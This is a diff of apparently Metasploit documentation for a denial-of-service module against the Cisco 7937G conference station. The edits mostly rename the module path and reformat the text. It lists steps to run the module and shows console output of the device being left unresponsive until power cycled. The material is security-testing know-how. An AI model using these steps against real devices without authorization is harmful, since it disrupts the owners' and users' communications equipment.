@@ -5,17 +5,23 @@
 
 ### Description
 
-This module exploits a bug in how the conference station handles incoming SSH connections that provide an incompatible key exchange. By connecting with an incompatible key exchange, the device becomes nonresponsive until it is manually power cycled.
+  This module exploits a bug in how the conference station handles incoming SSH
+  connections that provide an incompatible key exchange. By connecting with an
+  incompatible key exchange, the device becomes nonresponsive until it is manually power cycled.
 
 ## Verification Steps
 
   1. Obtain a Cisco 7937G Conference Station.
   2. Enable SSH Access on the device.
   3. Start msfconsole
-  4. Do: `use auxiliary/dos/cisco/cisco_7937G_DoS`
+  4. Do: `use auxiliary/dos/cisco/cisco_7937G_dos`
   5. Do: `set RHOST 192.168.1.10`
   6. Do: `run`
   7. The conference station should now be nonresponsive until it is power cycled
+
+## Options
+
+  No options
 
 ## Scenarios
 
@@ -23,10 +29,10 @@ This module exploits a bug in how the conference station handles incoming SSH co
 
 #### Successful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
@@ -40,7 +46,7 @@ msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 [-] 192.168.110.209 -     raise SSHException(
 [-] 192.168.110.209 - paramiko.ssh_exception.SSHException: Incompatible ssh peer (no acceptable kex algorithm)
 [-] 192.168.110.209 - 
-[*] 192.168.110.209 - DoS non-reset attack completed!
+[*] 192.168.110.209 - dos non-reset attack completed!
 [*] 192.168.110.209 - Errors are intended.
 [*] 192.168.110.209 - Device must be power cycled to restore functionality.
 [*] Auxiliary module execution completed
@@ -48,13 +54,13 @@ msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 #### Unsuccessful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
-[-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
+[-] 192.168.110.209 - Device doesn't appear to be functioning (already dos'd?) or SSH is not enabled.
 [*] Auxiliary module execution completed
 ```
 
@@ -62,10 +68,10 @@ msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 #### Successful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
@@ -79,7 +85,7 @@ msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 [-] 192.168.110.209 -     raise SSHException(
 [-] 192.168.110.209 - paramiko.ssh_exception.SSHException: Incompatible ssh peer (no acceptable kex algorithm)
 [-] 192.168.110.209 - 
-[*] 192.168.110.209 - DoS non-reset attack completed!
+[*] 192.168.110.209 - dos non-reset attack completed!
 [*] 192.168.110.209 - Errors are intended.
 [*] 192.168.110.209 - Device must be power cycled to restore functionality.
 [*] Auxiliary module execution completed
@@ -87,12 +93,12 @@ msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
 
 #### Unsuccessful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_DoS 
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > set rhost 192.168.110.209
+msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_DoS) > run
+msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
-[-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
+[-] 192.168.110.209 - Device doesn't appear to be functioning (already dos'd?) or SSH is not enabled.
 [*] Auxiliary module execution completed
 ```
